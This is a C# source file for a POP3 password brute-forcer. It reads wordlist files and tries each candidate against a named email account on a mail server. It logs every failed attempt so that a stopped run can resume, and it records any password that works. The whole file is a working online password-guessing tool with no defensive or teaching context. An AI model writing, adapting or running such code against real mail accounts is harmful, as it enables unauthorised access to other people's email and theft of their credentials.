using Pop3;
using System;
using System.Linq;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Text;
using System.Diagnostics;

namespace POP3Brutforce
{
    public sealed class Brutforce
    {
        private readonly string popServerName, email, fileLogPath;

        public Brutforce(string popServerName, string email, string fileLogPath)
             : this(popServerName, email)
        {
            this.fileLogPath = fileLogPath;
        }

        public Brutforce(string popServerName, string email)
        {
            this.popServerName = popServerName;
            this.email = email;            
        }

        public async Task TryFindPasswordFromFilesAsync(IList<string> fileNames)
        {
            foreach (string fileName in fileNames)
            {
                await Task.Yield();

                if (await TryFindPasswordAsync(fileName))
                {
                    break;
                }
            }
        }

        public async Task<bool> TryFindPasswordAsync(string fileName)
        {
            string lastPassword = await TrySearchLastPasswordFromLog();

            bool hasLastPwd = !String.IsNullOrEmpty(lastPassword);

            using (FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.Read, FileShare.Read))
            {
                using (var streamReader = new StreamReader(fileStream))
                {
                    while (!streamReader.EndOfStream)
                    {
                        string password = await streamReader.ReadLineAsync();

                        if (password.Length > 7)
                        {
                            if (hasLastPwd)
                            {
                                if (password.Contains(lastPassword))
                                {
                                    hasLastPwd = false;
                                }

                                continue;
                            }
                            
                            if (await TryConnectAsync(password))
                            {
                                Console.WriteLine(password);
                                await WriteToLog(String.Concat("PASSWORD: ", password));

                                return true;
                            }
                        }
                    }
                }
            }           

            return false;
        }

        private async Task<string> TrySearchLastPasswordFromLog()
        {
            if (String.IsNullOrEmpty(fileLogPath))
                return String.Empty;

            if (!File.Exists(fileLogPath))
                return String.Empty;

            string lastLine = await Task.Run(() => File.ReadLines(fileLogPath).Last(s => !String.IsNullOrEmpty(s)));

            int indexBegin = lastLine.IndexOf('#');
            int indexEnd = lastLine.LastIndexOf('#');

            return lastLine.Substring(indexBegin + 1, indexEnd - (indexBegin + 1));
        }

        private async Task<bool> TryConnectAsync(string pwd)
        {
            try
            {
                using (var pop3Client = new Pop3Client())
                {
                    await pop3Client.ConnectAsync(popServerName, email, pwd, true);

                    return true;
                }
            }
            catch (Exception ex)
            {
#if DEBUG
                Debug.WriteLine(ex.Message);
#else
                WriteToLog(String.Format("#{0}#:\t{1}", pwd, ex.Message)).Wait();
#endif
            }

            return false;
        }

        private async Task WriteToLog(string msg)
        {
            if (String.IsNullOrEmpty(fileLogPath))
                return;

            StreamWriter fileLog;

            if (File.Exists(fileLogPath))
            {
                fileLog = File.AppendText(fileLogPath);
            }
            else
            {
                fileLog = File.CreateText(fileLogPath);
            }

            using (fileLog)
            {
                await fileLog.WriteLineAsync(String.Format("{0}\t|\t{1}", DateTime.Now, msg));
                await fileLog.FlushAsync();
            }
        }
    }
}
